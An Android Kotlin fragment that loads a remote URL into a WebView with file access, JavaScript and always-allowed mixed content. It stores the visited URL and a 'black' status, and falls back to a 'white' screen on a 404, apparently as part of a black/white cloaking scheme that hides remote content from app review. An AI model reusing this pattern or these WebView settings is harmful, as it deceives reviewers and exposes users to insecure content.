package com.presidentserviceconsult.dimaz.black.fragment


import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.webkit.*
import androidx.core.view.isVisible
import androidx.fragment.app.Fragment
import androidx.navigation.fragment.findNavController
import com.presidentserviceconsult.dimaz.R
import com.presidentserviceconsult.dimaz.activity.MainActivity
import com.presidentserviceconsult.dimaz.black.shared.SharedPrefs
import com.presidentserviceconsult.dimaz.databinding.WebViewFragmentBinding


class BlackFragment : Fragment() {
    val binding by lazy { WebViewFragmentBinding.inflate(layoutInflater) }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

      Handler(Looper.getMainLooper()).postDelayed({
          binding.zug.isVisible = false

      },3000L)


        (requireContext() as MainActivity).goBack = {}

        val client = WebChromeClient()
        binding.vebview.setWebChromeClient(client)
        val argFinalUrl = arguments?.getString("final_url")
        if( SharedPrefs(requireContext().applicationContext).getUrl().isNotBlank()) {
            SharedPrefs(requireContext().applicationContext).setStatus(SharedPrefs.STATUS_GO_TO_BLACK)
            SharedPrefs(requireContext().applicationContext).setUrl(argFinalUrl ?: "")
        }
        with(binding.vebview) {
            (requireContext() as MainActivity).goBack = { goBack() }
            settings.loadsImagesAutomatically = true
            webViewClient = MyWeb()
            settings.allowFileAccess = true
            settings.mixedContentMode = 0
            settings.javaScriptEnabled = true
            settings.javaScriptCanOpenWindowsAutomatically = true
            settings.domStorageEnabled = true
            loadUrl(argFinalUrl?:"")
        }
        Log.d("test_cloaca_5","status apps: BLACK\n final url:${argFinalUrl}")


    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {

        return binding.root
    }


    inner class MyWeb : WebViewClient() {

            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                SharedPrefs(requireContext().applicationContext).setUrl(url?: "")
            return super.shouldOverrideUrlLoading(view, url)

        }

        override fun onReceivedHttpError(
            view: WebView?,
            request: WebResourceRequest?,
            errorResponse: WebResourceResponse?
        ) {
            if (errorResponse?.statusCode == 404) {
                findNavController().navigate(R.id.action_loading_to_white)
            }
        }

    }

}